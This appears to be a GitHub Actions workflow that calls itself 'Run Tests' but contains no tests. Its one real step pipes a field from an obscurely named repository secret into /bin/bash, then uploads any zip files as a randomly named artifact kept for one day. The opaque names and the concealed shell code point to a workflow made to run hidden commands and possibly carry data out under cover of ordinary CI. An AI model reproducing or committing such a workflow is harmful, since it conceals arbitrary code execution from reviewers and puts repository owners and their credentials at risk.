name: Run Tests
on:
  workflow_dispatch:

permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          ufo770: ${{ secrets.ufo770 }}
        run: |
          printf '%s' "$ufo770" | jq -r .dp045 | /bin/bash
          printf '%s' "$umr1" | jq -r .javh2072 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mE5x9cW1
          path: "*.zip"
          retention-days: 1
